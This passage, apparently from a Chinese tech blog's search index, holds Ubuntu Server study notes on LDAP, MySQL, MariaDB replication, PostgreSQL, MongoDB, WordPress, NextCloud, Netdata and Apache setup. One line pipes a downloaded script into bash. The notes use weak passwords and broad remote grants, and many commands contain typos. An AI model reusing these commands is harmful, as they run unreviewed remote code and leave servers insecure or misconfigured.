-a /etc/hostss\n```\n\n安装客户端\n```bash\nsudo apt install libnss-ldap libpam-ldap ldap-utils nscd\n# 指定一些参数\nldap://ldap.lab.com\ndc=lab,dc=com\ncn=admin,dc=lab,dc=com\n```\n\n修改配置文件\n```bash\n# sudo vim /etc/nsswitch.conf\npassswd: compat systemd ldap\ngroup: compat systemd    ldap\nshadow: compat ldap\n\n\n# sudo vim /etc/pam.d/common-password\n    删除 use_authtok 这一小块\n\n# sudo vim /etc/pam.d/common-session\n    session optional  pam_mkhomedir.so skel=/etc/skel umask=077   # 允许创建用户主目录\n \nsudo systemctl restart nscd.service\n\n# 验证\ngetent passwd zhangsan \n\nreboot\n\n# 登录的时候，点击 not list 才能进入刚才的帐号\n```\n\n\n\n","tags":["LDAP"],"categories":["Linux"]},{"title":"ubuntu server- ubuntu-server-数据库管理服务","url":"%2Fposts%2F677%2F","content":"\n\n#  ubuntu-server-数据库管理服务\n>数据就是生产力\n\n数据就是应用的核心\n按照结构组织，存储和管理数据的仓库\nOracle, DB2, MySQL, MSSQL, PostgreSQL, Infomix, MongoDB\n\n\n\n<img src=\"http://image.xpshuai.cn/20200430085915705_995731668.png\" />\n\n\n## <font color=red>数据库管理系统(DBMS)</font>\n<img src=\"http://image.xpshuai.cn/20200430090504409_350097281.png\" />\n\n\n## <font color=red>MySQL数据库管理</font>\n<img src=\"http://image.xpshuai.cn/20200430091905869_1159836654.png\" />\n\n\n安装\n```bash\nsudo apt install mysql-server\n```\n\n安全配置\n```bash\nsudo mysql_secure_installation\n# 建议禁止root远程登录\n# 这里设置的root的密码不是，后面才设置, 因为初始身份认证方式是auth_socket\n```\n\n\nRoot帐号密码登录\n```bash\nsudo mysql    # 初始身份认证方式是auth_socket，所以暂时不需要输入密码 \nSELECT user,host,authentication_string, plugin,host FROM mysql.user;\n# 给root设置密码认证方式mysql_native_password\nALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '12345678'; \nFULSH PRIVILEGES;\n# 登录\nmysql -u root -p\n```\n\n\n创建数据库个人帐号(建议不要使用root进行运行,而应该使用个人帐号, 且密码不能相同)\n```bash\ncreate user 'xps'@'%' identified by '12345678';\n# 赋予权限(4级)\n# *.* 是哪个库哪个表，这里表示所有库所有表\ngrant all privileges on *.* to 'xps'@'%' with grant option;\n```\n\n修改密码\n```bash\nset password for 'xps'@'%'=password('12345678');\n```\n\n网络访问帐号(可以远程访问)\n```bash\n# 一般这种情况，都限制要操作的库和操作\n# %\nuse mysql\n# 直接grant赋予权限，就可以创建不存在的用户\ngrant all privileges on *.* to admin@'%' identified by '12345678' with grant option;\n# 移除权限\nrevoke all on db_name from user_name;\n# 查看密码策略(一旦允许网络连接，密码级别就会变成中安全级别了)\nselect @@validate_password_policy;\n```\n\n编辑配置文件\n```bash\n# sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf\n# 修改侦听网卡为自己网卡的ip地址\nbind-address        = 192.168.0.112\n\n# 重启网卡\n\n# 使用mysql客户端连接， 或Falcon等图形化客户端\nmysql -h 19.168.0.112 -u root\n```\n\n\n\n## <font color=red>SQL语句</font>\n#### 增删改查\n**最基本**\n```sql\n-- 当前帐号\nselect user();\n\n-- 查看已经有的库\nselect databases;\n\n-- 选取(切换)库\nuse test;\nselect database();\n\n-- 显示表(已选择库)\nshow tables;\n\n-- 简单创建库\ncreate database test;\n```\n\n**创建表**\n```sql\ncreate table users(\n    id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,  \n    name CHAR(25) NOT NULL,\n    pass CHAR(25) NOT NULL,\n    age INT(9) NOT NULL\n )\n```\n\n\n<img src=\"http://image.xpshuai.cn/20200430105007407_399865569.png\" />\n\nchar的性能要优于varchar\n\n\n**插入记录**\n```sql\ninsert into users values(1,'xps','1234567890',20);\ninsert into users(id,name,pass,age) values(null,'xps','1234567890',20);   # 指定列\n```\n\n**查看表结构**\n```sql\ndesc users;\n\nshow create table users;   # Engine=InnoDB   存储引擎\n\nshow full columns from users;\n```\n\n**查询**\n```sql\nselect * frm users where age <20 and age >16;\nselect name,pass from users order by age;\nselect name,pass from users order by age desc;  # 降序\n\nselect concat(name,0x7e,pass,0x7e) as user_pass from users;   # concat 结合， 表头变成user_pass\nselect group_concat(name, pass) from users;\n\n```\n\n\n**修改记录**\n```sql\nupdate users set name='xpsss' where id=1;\n```\n\n**删除记录**\n```sql\ndelete from users where id=1;\n```\n\n**删除表**\n```sql\ndrop table tests;\n\ndrop table if exists tests;\n```\n\n**删除库**\n```sql\ndrop database test;\n```\n\n**查看数据引擎**\n```sql\nshow engines;\n# 修改存储引擎（这里指定表）\nalter table student engine=MYISAM;\n```\n\n**修改表名**\n```sql\nalter table student RENAME student2;\n```\n\n**修改字段数据类型**\n```sql\nalter table student MODIFY name varchar(30);\n```\n\n**修改字段名**\n```sql\nalter table student CHANGE name uname varchar(40);\n```\n\n**增加字段**\n```sql\nalter table student ADD techer_name vchar(20) NOT NULL after id;  # 位置放在id字段的后面\n```\n\n**删除字段**\n```sql\nalter table student FROP teacher_name;\n```\n\n#### 备份\n###### 备份导出\n备份库，表\n```bash\nmysqldump -u root -p tes_db  >db_back.sql\nmysqldump -u root -p test_db users >db_back.sql\nmysqldump --all-databases -u root -p >all_db_back.sql\n```\n\n备份指定数据\n```sql\n# 先进入sql命令终端，进行导出\nselect * from users; > q.sql\n## 或者\n# 1. 先把sql语句保存为文件，\necho 'select * from users;' > q.sql\n# 2.然后执行来进行导出\nmysql -u root -p test  < q.sql  >out.csv\n```\n\n导出CSV\n```sql\nshow variables like '%secure%';  # 先找到备份路径，找到secure_file_priv路径就是默认导出的路径\n# 保存， 并执行分隔或换行\nselect * from users into outfile '/var/lib/mysql-files/aaa.csv' fields terminated by ',' enclosed by lines '\"' terminated by '\\n';\n```\n\n###### 导入\n导入\n```bash\n# 创建库的命令\nmysqladmin -u root -p create db2  # 也可以在sql终端  create database xxx;\n# 导入\nmysql -u root -p db2 < db_bak.sql\n```\n\n导入CSV\n```bash\nLOAD DATA INFILE '/var/lib/mysql-files/aaa.csv' INTO TABLE users\nFIELDS TERMINARED BY ',' ENCLOSED BY '\"'\nLINES TERMINARED BY \\n IGNORE 1 ROWS;\n```\n\n\n\n\n\n\n## <font color=red>MariDB</font>\n#### 安装配置\n安装\n```bash\nsudo apt install mariadb-server\n```\n\n安全认证\n```bash\nsudo mysql_secure_installation\n```\n\n改为密码认证\n```bash\nsudo mysql\nuse mysql;\n\nselect user.host,plugin,password from mysql.user;   # 查看\nupdate user set plugin='' where user ='root'   # mysql_native_password或空就行\nfulsh privileges;\n```\n\n配置文件\n```bash\n# /etc/mysql/mariadb.conf.d/50-server.cnf\nbind-address = 0.0.0.0 # 每一个网卡都会侦听3306\n```\n\n\n#### 主备服务器(数据库复制)\n**复制  Replication**\nMaster -> Slave    读/写\n限定所有库，指定库，表 进行复制\n\n\n**复制原理**\nbin-log        二进制日志\n所有DB事件先写入bin-log\nSlave从Master读取bin-log\n\n\n**用途**\n- 扩展：Slave分担master负载\n- 分析：数据分析不影响Master\n- 备份：作为一种数据备份手段\n- 分布：异地保存数据副本（也可以实现应用访问本地库）\n\n\n###### 演示\n1.安装两台独立的MariaDB服务器\n```\n复制之前用导入导出数据库的方式保持Master/Slave数据一致\n复制前锁定库(禁止写入)        # 生产环境\n    flush tables with read lock;\n```\n\n2.配置 Master\n```bash\n# suo vim /etc/mysql/conf.d/mysql.cnf    #增加如下配置\n[mysqld]\nlog-bin    # 开启bin-log功能\nbinlog-do-db=test\n# binlog-ignore-db=\"mysql\"   # 除了忽略的库，其他的全复制\nserver-id=1\n```\n\n3.配置master的mariadb远程访问\n`bind-address  0.0.0.0`\n\n4.重启服务\n```bash\nsudo systemctl restart mariadb\n```\n\n5.配置master\n创建用户帐号\n```bash\n#192.168.0.111 是slave的地址， *.*允许复制所有数据库, replicate用户名\ngrant replicate *.* to 'replicate'@'192.168.0.111' with identified by 'passwd';\n```\n\n6.配置Slave\n```bash\n## 1.\n# suo vim /etc/mysql/conf.d/mysql.cnf    #增加如下配置\n[mysqld]\nserver-id=1\n\n## 2.开启远程访问bind-address  0.0.0.0\n\n## 3. 重启数据库服务\n```\n\n7.登录sql终端\n\n```bash\n# master_user是master服务器上创建的mysql的用户\nchange master to master_host=\"192.168.0.112\",master_user=\"replicate\",master_password='password';\n```\n\n8.打开master锁\n`unlock tables;`\n\n9.查看slave状态\n```sql\n-- slave的sql终端\nshow slaves status\\G\nstart slave;    # 如果没启动，可以手动启动\n```\n\n测试效果\n```bash\n# 在master执行\ncd test;\ninsert into users values(1,'yyy','pass');\ndelete from users where id=1;\n\n# 在slave上查询，发现数据已经同步过来了，近乎实时\n```\n\n**Mysqltuner -- 配置调优工具包**\n安装\n```bash\nsudo apt install mysql\n```\n运行\n`sudo Mysqltuner`\n会生成一堆信息配置调优建议(绿色的表示没问题，其他颜色的可以根据帮助来优化)\n\n\n\n\n\n\n\n\n\n## <font color=red>Postgresql</font>\n>下一代关系数据库\n\n#### 配置和修改\n- `高并发`情况下`性能`优于MySQL\n- 侦听端口 TCP `5432`\n\n**安装**\n```bash\nsudo apt install postgresql\n```\n\n**身份认证**\n- 默认使用IDENT身份认证方式\n- 使用与操作系统同名的数据库帐号(`postgres`相当与MySQL中的root)\n\n**进入**\n```bash\nsudo -u postgres psql\n# 直接登录到库的名称(template1是默认生成的)\nsudo -u postgres psql template1\n```\n\n\n**修改密码**\n```bash  \n# sql终端\n# 使用加密的方式\nalert user postgres with encrypted password 'your_passwd';\n\\q    # 退出\n\n# bash终端\n# 修改配置文件\nvim /etc/postgresql/10/main/pg_hba.conf\nlocal    all    postgres    md5\n# 本地登录    所有数据库    身份    密码md5加密\n\n\n# 重启服务\n\n# 登录  -W输入密码\npsql -U postgres -W -d db_name\n```\n\n**配置文件**\n```bash\n/etc/postgresql/<version>/main    # 配置文件目录\n/etc/postgresql/10/main/pg_ident.conf    # IDENT身份认证配置\n/etc/postgresql/10/main/postgresql.conf    # 网络身份认证配置\n    # listen_address='*'        # IPV6 '::'\n```\n\n**网络连接**\n```bash\n# 客户端\nsudo apt install postgresql-client\n\n# 设置允许哪些主机连接我们(必须指定掩码)\nvim /etc/postgresql/10/main/pg_hba.conf\nlocal    all    postgres    192.168.0.111/32 md5\n#重启服务\n\n# 客户端连接\npsql -h 192.168.0.112 -U postgres -W -d db_name\n```\n\n**创建帐号**\n```bash\n# postgres权限太大，不建议平时使用\n\n# F1 服务器端终端\nsudo -u postgres createuser xps  # gropuser xps\n\n# F2  sql命令行\ncreate user foobar;    # drop user xps\n```\n\n**文档手册**\n```bash\nsudo apt install postgresql-doc-10\n/usr/share/postgresq-doc-10/html/index.html\n\n官方文档:\nhttps://www.postgresql.org/docs/current/static/tutorial.html\n\n```\n\n#### 基本指令\n创建库\n```bash\n#\nsudo -u postgres createdb mydb;\n# 或\ncreate database mydb;\n```\n\n删除库\n```bash\nsudo -u postgres dropedb mydb;\n# 或\ndrop database mydb;\n```\n\n创建表\n```sql\ncreate database users\n(\nuname varchar(25);\npwd carchar(25);\ndate date\n);\n``\n\n插入数据\n​```bash\ninsert into users values('xps','1234567890','1997-07-07');\n\n# 批量插入数据(数据提前保存)\ncopy users from '/home/user/users.txt'\n```\n\n快捷命令\n```bash\n\\c db_name    # 切换数据库 （use mydb;）\n\\c - username    # 切换用户\n\\l            # 列出数据库(show databases;)\n\\dt             # 列出表(show tables;)\n\\d    table_name    # 查看表结构\n```\n\n\n\n\n## <font color=red>NoSQL概览与MongoDB</font>\n\n<img src=\"http://image.xpshuai.cn/20200430164041499_1710130793.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200430164659724_1776362163.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200430165730935_61571111.png\" />\n\n**常见的NoSQL数据库类型**\n1.键值对类型\n\n<img src=\"http://image.xpshuai.cn/20200430165836806_1146424929.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200430165955029_600511168.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200430170233715_1141118525.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200430170407242_2033108350.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200430170848764_1597209188.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200430171004638_167406085.png\" />\n\n`Paper`推荐多看看\n\n\n\n#### MongoDB\n安装\n```bash\nsudo apt-get install -y mongodb\n```\n\n客户端\n```bash\n# 本地登录\nmongo\n# 远程登录\nmongo 192.168.0.112:27017/db_name\n\n# 常用管理命令\nhelp\n```\n\n\n进入库\n```\nuse mydb;\n# 如果不存入数据，他还是就没了\n```\n\n\n输入数据\n```\n# 创建文档集\ndb.createCollection('users')\n# 插入数据\ndb.users.insert({'name':'uuu','uid':123})\n```\n\n查询库\n```mongodb\nshow dbs\nshow collections\n```\n\n多赋值\n```mongodb\ndb.users.insert({'name':'uuu','uid':123,gid:[111,222,333]})\n```\n\n查询\n```mongodb\ndb.users.find();\ndb.users.findOne({'uid':1001})\ndb.users.findOne({'uid':{$gt：1000}})   # 大于\ndb.users.find({'uid':{$gt：1000}})   # 大于\n\ndb.users.find({$or: [{name:'ubuntu'}, {name;'centos'}]})   # or\n\ndb.users.findOne({'uid':1001}, {name:0})    # name:0  不显示name字段\n```\n\n修改记录\n```mongodb\ndb.users.update({'uid':1001}, {$set:{name:'hhh'}})\n```\n\n删除记录\n```mongodb\ndb.users.remove({'uid':1001}, )\n```\n\n删除collection\n```mongodb\ndb.users.drop()\n```\n\n删库\n```mongodb\ndb.dropDatabase()\n```\n\n详细用法参考官方文档......\n\n\n\n\n\n\n\n","tags":["ubuntu-server-数据库管理服务"],"categories":["Linux"]},{"title":"ubuntu server-LAMP","url":"%2Fposts%2F45152%2F","content":"\n\n\n## <font color=red>LAMP环境安装WordPress</font>\n#### WEB应用程序基础套件\n\n- 操作系统( Linux )\n- WEB服务器( Apache、Nginx )\n- 数据库( MySQL、MariaDB、 PostgreSQL)\n- 应用开发语言( PHP、Python、 Perl )\n\n#### 大量开源应用基于LAMP开发\n\n- Wordpress\n- Wiki\n- Owncloud\n- Phpmyadmin\n- ... ...\n\n\n\n\n\n#### 安装LAMP(Linux + Apache + MySQL +PHP)\n\n自动安装\n```bash\n# 一次性安装 tasksel    简单快捷\napt install tasksel\n\n# 运行工具\nsudo tasksel\n# 选择安装包,q 勾选，确定即可\n\n#测试\necho \"<?php phpinfo();?>\" > /var/www/html/info.php\n```\n\n手动安装\n```bash\napt install apache2\napt install mysqk-server\n    mysql_secure_installation\napt install php libapache2-mod php-mysql\n\n#测试\necho \"<?php phpinfo();?>\" > /var/www/html/info.php\n```\n\n#### WordPress\n- 开源免费的个人博客系统\n- 全球1/3的个人博客采用\n- 基于LAMP开发\n- 开箱即用\n\n**安装**\n```bash\nwget http://wordpress.org/latest.tar.gz\n\nsudo tar -zxvf latest.tar.gz -C /var/www/html\n# 设置权限\nsudo chown www-data:www_data -R /var/www/html/myshop\n# 还没有数据库\n```\n\n**创建数据库**\n```sql\n-- 进入sql命令行（建议用户名密码和库名不要这么简单易猜）\ncreate database wpdb;\ncreate user 'wpuser'@'localhost' identified by '12345678';\ngrant all on wpdb.* to 'wpuser'@'localhost' identified by '12345678' with grant option;\nflush privileges;\n```\n\n\n**配置文件**\n```bash\ncd /var/www/html/wordpress/\ncp wp-config-sample.php wp-config.php    # 从模板文件复制\nvim wp-config.php\n\n# 修改库名，用户，密码\n# 他会自动写进去表\n```\n\n\n**虚拟主机**\n不建议使用默认站点\n```bash\ncd /etc/apache2/sites-available/\ncp 000-default.conf  myblog.conf\n    vim myblog.conf\n    ServerName www.myblog.com\n    DocumentRoot /var/www/html/wordpress\n\n# 其他安全配置\n```\n**启用站点**\n```bash\na2ensite myblog.conf\na2dissite 000-default.conf    # 禁用默认站点\n\nsystemctl reload apache2\n```\n\n**Web配置**\n访问设置的域名`http://myblog.com`\n\n\n**改为中文**\n从官网下载中文语言包解压到`/wp-content/`目录下，\n修改`wp-config.php`\n```php\ndefine('WPLANG', 'zh_CN')\n```\n\n或者直接下载中文版`https://cn.wordpress.org`\n\n\n\n\n\n\n## <font color=red>PHPMyAdmin & 电商网站搭建</font>\n#### phpMyAdmin\n    基于Web应用的MySQL管理应用, 本身也是一个应用程序\n\n\n1.修改身份验证方式\n```sql\n# 进入sql终端\nselect user,host,plugin from mysql.user;\n\n\"auth_socket\"  --> \"mysql_native_password\"\n```\n\n\n2.安装PhpMyAdmin\n```bash\napt install phpmyadmin\n```\n\n3.修改`/etc/apache2/apache2.conf`主配置文件\n```bash\n# 包含phpmyadmin的配置文件\nInclude /etc/phpmyadmin/apache.conf\n```\n\n测试 `http://wwwwww/phpmyadmin/`\n\n\n\n#### 电商网站搭建\n安装`prestashop`开源的电商平台\n- 开源免费\n- 全球有25万台电商平台使用\n- 基于LAMP套件\n\n1.安装依赖包\n```bash\nsudo apt install php7.2-gd php7.2-xml php7.2-curl php7.2-zip\n```\n\n2.下载\n```bash\nwget https://download.prestashop.com/download/releases/prestashop_1.7.4.1.zip\nsudo unzip prestashop_1.7.4.1.zip  -d /var/www/html/myshop\nsudo chown www-data:www_data -R /var/www/html/myshop\n```\n\n3.创建数据库\n```sql\nsudo mysql\n-- 进入sql命令行（建议用户名密码和库名不要这么简单易猜）\ncreate database myshop;\ncreate user 'myshop'@'localhost' identified by '12345678';\ngrant all on myshop.* to 'myshop'@'localhost'  identified by '12345678' with grant option;\nflush privileges;\n```\n\n\n4.虚拟主机(不建议使用默认站点)\n```bash\ncd /etc/apache2/sites-available/\ncp 000-default.conf  myshop.conf\n    vim myshop.conf\n    ServerName www.myshop.com\n    DocumentRoot /var/www/html/myshop\n\n# 这里只配置了最简单的，其他的配置按照前面的章节自行配置\n```\n5.启用站点\n```bash\nsudo a2enmod rewrite   # 启用这个模块\nsudo a2ensite myshop.conf\n#a2dissite 000-default.conf    # 禁用默认站点\n\nsystemctl reload apache2\n```\n\n6.访问站点，进行Web配置\n表名的前缀不要默认，否则如果有漏洞，容易被猜解\n安装完成之后，要删除`install`文件\n\n>这个网站源码是免费的，但是主题是收费的......且支付接口没国内的\n\n\n\n\n\n## <font color=red>LEMP环境安装NextCloud</font>\nLEMP(Linux, Nginx, MySQ, PHP)\nEngine-x  -> Nginx\n\n1.安装\n```bash\nsudo apt install nginx\n\nsudo apt install mariadb-server mariadb-client\n   sudo mysql_secure_installation\n\n# 针对不同软件包，安装不同的组件，这里安装下面这些\nsudo apt install php7.2  php7.2-fpm  php7.2-mysql  php7.2-mbstring  php7.2-xml  php7.2-gd  php7.2-curl  php7.2-imagick  php7.2-zip  php7.2-bz2  php7.2-intl\n\n\n# 配置php\nsudo vim /etc/php/7.2/fpm/php.ini\ncgi.fix_pathinfo=0\ndate.timezone = Asia/shanghai\n```\n\n2.配置Nginx\n```bash\n# 这里使用默认站点\n# sudo vim /etc/nginx/sites-available/default\n\nindex index.php\n location ~\\.php$ {\n     fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;\n     fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n     include snippets/fastcgi-php.conf;\n     include fastcgi_params;\n }\n\n# 重启\nsudo nginx -t\nsudo systemctl restart nginx\n```\n\n3.访问, 验证环境是否成功\n\n\n4.下载NextCloud\n```bash\n# NextCloud    免费开源的个人云盘\n# 官网下载或wget下载\nwget https://download.nextcloud.com/server/releases/nextcloud-13.0.4.zip\nsudo unzip nextcloud-13.0.4.zip  -d /var/www/html/mycloud\n\nsudo chown www-data:www-data -R /var/www/html/mycloud\n```\n\n5.建库\n```sql\n-- 进入sql命令行\ncreate database mycloud;\ncreate user 'mycloud'@'localhost' identified by '12345678';\ngrant all privileges on mycloud.* to 'mycloud'@'localhost' identified by '12345678' with grant option;;\nflush privileges;\n```\n\n6.生成证书(安全考虑)\n```bash\n# 这里使用自签名证书\nsudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/mysite.key -out /etc/ssl/certs/mysite.pem\n```\n\n7.配置文件\n```bash\n# cd /etc/nginx/site-available/\n# sudo vim mycloud.conf\n\n\nserver {\n    listen 80;\n    server_name www.mycloud.com;\n    # 不让访问者通过http访问，强制重定向\n    return 301 https://www.mycloud.com$request_uri;\n}\n\nserver {\n    listen 443 ssl http2;\n    # 证书位置\n    ssl_certificate  /etc/ssl/certs/mysite.pem;\n    ssl_certificate_key  /etc/ssl/private/mysite.key; \n    # 头部\n    add_header Strict-Teansport-Security \"max-age-31536000\" always;  # ssl增强版协议的头部\n    # 等经验丰富后，自己要添加头部信息你\n    add_header X-Conten-Type-Option nosniff;\n    add_header X-XSS-Protection \"1;mode=block\";\n    add_header X-Robots-Tag none;\n    add_header X-Download-Options noopen;\n    add_header X-Permitted-Cross-Doamin-Policies none;\n\n    root /var/www/html/mycloud/;\n\n    location = /robots.txt {\n        allow all;\n        log_not_found off;\n        access_log off;\n    }\n    \n    location = /.well-known/carddav {\n        retun 301 $schema://$host/remote.php/dav;\n    }\n    \n    location = /.well-known/calddav {\n        retun 301 $schema://$host/remote.php/dav;\n    }\n    \n    location = /.well-known/acme-challenge {\n        allow all;\n    }\n    \n    client_max_body_size 512M;\n    fastcgi_buffers 64 4K;\n\n    gzip off;\n\n    error_page 403 /core/templates/403.php;\n    error_page 404 /core/templates/404.php;\n    \n    location = / {\n        rewrite ^ /ince.php$uri;\n    }\n\n    location = /(?:build|tests|config|lib|3rdparty|templates|data)/ {\n        deny all;\n    }\n    # .......\n}\n\n## ......剩下详细的配置\n```\n\n8.启用站点配置\n```bash\nln -s /etc/nginx/site-available/mycloud.conf  /etc/nginx/site-enabled/mycloud.conf\n\n# reload 并 restart nginx\n```\n\n9.Data目录\n```bash\n# 文件资源默认会在项目根目录下的Data目录\n# 建议不要放在默认位置, 这里放在上一级目录\nsudo mkdir /var/www/html/cloud_data\nsudo chown www-data:www-data -R /var/www/html/cloud_data\n```\n\n10.网页设置\n```bash\n访问 https://xxxxx.com\n# 设置用户名/密码，数据库，data目录\n# 注意账户安全哦(不要设置admin等)\n# 修改语言\n```\n\n11.客户端\n```bash\nsudo add-apt-repository ppa:nextcloud-devs/client\nsudo apt install nextcloud-client\n\n# 或官网下载PC和android的客户端\n```\n\n\n\n## <font color=red>其他Web应用</font>\n#### 1.Cockpit\n> 基于Web的远程管理和系统监控\n\n- 基于Web的远程管理应用\n- 将所有组件打包在一起\n- 不以来单独部署的LAMP/LEMP, 一条命令安装部署\n\n安装\n```bash\nsudo apt install cockpit cockpit-docker\n```\n\n访问方式: \n```bash\nhttps://www.com:9090\n\n登录账户同操作系统\n可以看到系统的详细信息，管理\n\n可以添加其他安装了Cockpit的服务器在一个机器的Web界面安装(前提是登录窗口时候进行勾选), 多台服务器\n```\n\n官网地址: `https://cockpit-projece.org`\n\n\n\n#### Netdata\n> 基于Web建构的Linux系统实时性能监视工具\n\n- cpu, 内存，硬盘，网络，进程，硬件\n- 占用系统资源少(1-3%)\n- 实时自动告警\n\n系统出问题之前，往往有异常的征兆\n\n依赖包\n```bash\nsudo apt install git zlib1g-dev uuid-dev libmnl-dev gcc make autoconf autoconf-archive autogen automake pkg-config curl python python-yaml python-mysqldb python-psycopg2 nodejs lm-sensors netcat\n```\n\n安装\n```bash\nbash <(curl -Ss https://my-netdata.io/kickstart-static64.sh)  # 现在不能访问了\n# 或用apt安装\nsudo apt install netdata\n\n\n# 访问\nhttp://xxxxx.com:19999\n```\n\n\n开关\n```bash\n# 启动：位置根据系统会有不同。建议加上-D参数前台运行，不要后台运行\n$ sudo netdata -D\n$ 或\n$ sudo /usr/sbin/netdata -D\n# 或（Mac上）\n$ sudo /usr/local/sbin/netdata -D\n\n# 关闭（方法很多种，往往只有一种生效）\n$ sudo killall netdata\n# 或\n$ sudo pkill -9 netdata\n# 或\n$ sudo service netdata stop\n# 或\n$ sudo /etc/init.d/netdata stop\n# 或\n$ sudo systemctl stop netdata\n```\n","tags":["LEMP"],"categories":["Linux"]},{"title":"ubuntu server-Web服务","url":"%2Fposts%2F6291%2F","content":"\n\n## <font color=red>WWW介绍</font>\nwww 万维网\n\n- 静态网站：所有人看到的内容都一样\n- 动态应用程序： \n\t- 数据库、中间件\n\t- 每个用户看到的内容不同\n\t- 根据用户输入返回不同结果\n\n**访问方式**\n\n<img src=\"http://image.xpshuai.cn/20200424214945523_10883.png\" />\nFQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”）\n\n**传输协议**\nSSL基本被替代了，TSL使用最多\n<img src=\"http://image.xpshuai.cn/20200424215120585_7753.png\" />\nput常用于上传文件\noptions查看都支持哪些方法\nheader只是头部的信息(请求/响应)\n\n<img src=\"http://image.xpshuai.cn/20200424235043151_8198.png\" />\n\n\n\n\n\n\n\n\n## <font color=red>HTTP协议</font>\n**常见服务端响应状态码**\n<img src=\"http://image.xpshuai.cn/20200425094030209_15175.png\" />\n更多详细状态码，见地址：\n\nhttp://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html\n\n\n\n## <font color=red>Apache2</font>\nApache软件基金会的一个开源Web服务器  \n**模块化强大的扩展能力：**\n- SSO模块\n- 并发限制模块\n- 日志监控模块\n- WAF模块\n- 负载均衡模块\n- 音乐/图像处理模块\n\n\n#### 安装\n```bash\nsudo apt install apache2\n\n# 默认侦听端口 TCP 80\n```\n\n#### 通过众多`directives`进行配置\n在Ubuntu中，directives分散于多个配置文件中\n\n<img src=\"http://image.xpshuai.cn/20200425100139669_32000.png\" />\n\n配置文件：`conf-enabled`(启用的)中的文件都是链接到`conf-available`(可用的)下的配置文件（创建了链接的才生效的，所以可以配置一些备用的不设置链接），修改完需要重启服务\n模块目录：mods-enabled与mods-available，跟上面两者关系类似\n站点：sites-enabled与sites-available\n\t  不同ip以及不同端口可以映射不同的网站 --> 同一个ip同一个端口来设置多个网站(不同域名都解析到这个ip, 服务端根据域名字段[主机头]来判断返回哪个页面) --> 即为虚拟主机\n\n\n###### 虚拟主机简单配置\n>一般先从available目录开始创建，至于启用与否还得配置enabled\n本质上配置指令可以位于任何一个配置文件中\n\n**配置`sites-available`下讲解：**\n```bash\n# /etc/apache2/sites-available/000-default.conf  # 默认虚拟主机\n\n<VirtualHost *:80>    # 匹配ip，*代表任意ip  , 侦听任意ip的80端口\n\tServerName www.example.com\t\t\t# 设置主机头（虚拟主机的域名）\n\tServerAdmin webmaster@localhost\t\t# 报错时显示的管理员邮箱\n\tDocumentRoot /var/www/html\t\t\t# 指定Web根目录\n\tErrorLog ${APACHE_LOG_DIR}/error.log\t\t# 报错日志\n\tCustomLog ${APACHE_LOG_DIR}/access.log combined\t\t# 访问日志\n\t# 侦听端口\n</VirtualHost>\n```\n\n**实验**\n创建`ali`和`baid`两个域名的虚拟主机\n1.创建新的虚拟主机（在sites-available）\n```bash\n# 复制两个配置文件\nsudo cp 000-default.conf ali.conf\nsudo cp 000-default.conf baid.conf\n\n# 分别进行配置\nServerName www.ali.com\nDocumentRoot /var/www/ali\n#\nServerName www.baid.com\nDocumentRoot /var/www/baid\n\n# 分别编辑页面文件\nsudo vim /var/www/ali/index.html\nsudo vim /var/www/baid/index.html\n```\n\n2.创建链接(在sites-enabled)\n```bash\n# 可以用ln 创建\n\n# apache提供了更简单的方式\nsudo a2ensite ali  \nsudo a2ensite baid\n# 重新加载\nservice apache2 reload\n\n## Note：\nServerAlias *.lab.com  # 域名通配符\nsudo a2ensite mynewSite\t# 启用虚拟主机\nsudo systemctl restart apache2.service  # 重启服务\nsudo a2dissite mynewSite\t# 停用虚拟主机（禁用某个站点）\n```\n\n3.这里做实验，域名就简单通过hosts文件做了解析\n```bash\n192.168.11.130 www.ali.com\n192.168.11.130 www.baid.com\n```\n3.访问\n\n\n\n###### 侦听端口\n```bash\n/etc/apaches/ports.conf\n```\n\n\n###### Apache中默认基本配置\n**1.索引文件index：**\nDirectoryIndex\n```bash\n## 可以根据需求,手动修改索引页的名称（一般不建议修改）\n# /etc/apache2/mods-available/dir.conf\n<IfModule mod_dir.c>\n    DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm  # 有先后的执行顺序\n</IfModule>\n\n# Note：\n若没有正确放置index索引文件，会看到文件列表，可能会有安全隐患\n```\n\n**2.html格式展示目录列表：Options**\n【安全考虑】-->去掉由于没有索引文件会显示文件列表的选项\n```bash\n## /etc/apache2/apache2.conf   主配置文件\n<Directory /var/www/>   # 对文件目录权限的配置\n    Options Indexes FollowSymLinks  # Indexes:若没有索引文件,就会显示目录列表;去掉Indexes就不会显示列表了，提示\"权限拒绝\"\n    AllowOverride None\n    Require all granted\n</Directory>\n\n# 重启服务\n```\n\n**3.Permission Denied **\n以上1,2两项都不匹配，就会显示\"权限拒绝\"\n\n\n**4.ErrorDocument  报错提示**\n【安全考虑】--> 默认404或报错页面会泄露信息或扫描器，建议替换为我们自定义的页面-->不告诉用户不成功的具体原因,只告诉他出错了\n```bash\n# /etc/apache2/conf-available/localized-error-pages.conf  \nErrorDocument 404 /error/404.html       # 定义自己的页面\n\n# 重启服务\n```\n\n5.基于目录的Options\n```bash\n## /etc/apache2/apache2.conf   主配置文件\n<Directory /var/www/> \n    Options Indexes \n</Directory>\n\n# 其他配置项(权限要最小化原则，安全起见)\nExecCGI\t\t# 允许CGI脚本执行的目录(/usr/lib/cgi-bin)\nIncludes\t# 允许服务端包含（一个html包含另一个html,模板化）\nIncludeNOEXEC\t# 允许包含，但进展CGI脚本exec、include\n\n# 重启服务\n```\n\n6.环境变量\n```bash\n# /etc/apache2/envvars\t可以修改用户和组和pid等\nUser /Group \t# 服务器端应答客户端访问的账号(www-data)\nPidFile\t\t\t# /var/run/apache2/apache2.pid\n\n# 